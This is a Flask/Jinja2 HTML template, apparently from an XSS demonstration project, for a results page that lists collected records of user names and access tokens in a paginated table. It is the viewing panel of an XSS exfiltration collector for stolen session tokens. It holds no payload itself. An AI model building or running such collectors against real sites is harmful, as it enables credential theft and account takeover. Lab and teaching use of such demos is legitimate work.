<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>XSS Data Collection - Results</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
</head>
<body>
<div class="container">
    <header>
        <h1>Collected XSS Data</h1>
        {% if error %}
        <div class="alert alert-danger">{{ error }}</div>
        {% endif %}
    </header>

    <main>
        {% if data %}
        <div class="table-responsive">
            <table>
                <thead>
                <tr>
                    <th>ID</th>
                    <th>Timestamp</th>
                    <th>User</th>
                    <th>Access Token</th>
                </tr>
                </thead>
                <tbody>
                {% for item in data %}
                <tr>
                    <td>{{ item.id }}</td>
                    <td class="timestamp">
                        <span class="date">{{ item.timestamp.split('T')[0] }}</span>
                        <span class="time">T{{ item.timestamp.split('T')[1] }}</span>
                    </td>
                    <td>{{ item.current_user }}</td>
                    <td class="token">
                        <pre class="token-value">{{ item.access_token }}</pre>
                    </td>
                </tr>
                {% endfor %}
                </tbody>
            </table>
        </div>

        {% if pagination.pages > 1 %}
        <div class="pagination">
            <span class="page-info">Page {{ pagination.page }} of {{ pagination.pages }}</span>

            <div class="page-controls">
                {% if pagination.has_prev %}
                <a href="{{ url_for('main.display_data', page=pagination.prev_num) }}" class="page-link">&laquo;
                    Previous</a>
                {% else %}
                <span class="page-link disabled">&laquo; Previous</span>
                {% endif %}

                {% for page_num in pagination.iter_pages(left_edge=2, right_edge=2, left_current=1, right_current=1) %}
                {% if page_num %}
                {% if page_num == pagination.page %}
                <span class="page-link active">{{ page_num }}</span>
                {% else %}
                <a href="{{ url_for('main.display_data', page=page_num) }}" class="page-link">{{ page_num }}</a>
                {% endif %}
                {% else %}
                <span class="ellipsis">â€¦</span>
                {% endif %}
                {% endfor %}

                {% if pagination.has_next %}
                <a href="{{ url_for('main.display_data', page=pagination.next_num) }}" class="page-link">Next
                    &raquo;</a>
                {% else %}
                <span class="page-link disabled">Next &raquo;</span>
                {% endif %}
            </div>
        </div>
        {% endif %}

        {% else %}
        <div class="no-data">No data collected yet</div>
        {% endif %}
    </main>

    <footer>
        <p>&copy; {{ now.year }} XSS Data Collection Demo</p>
    </footer>
</div>
</body>
</html>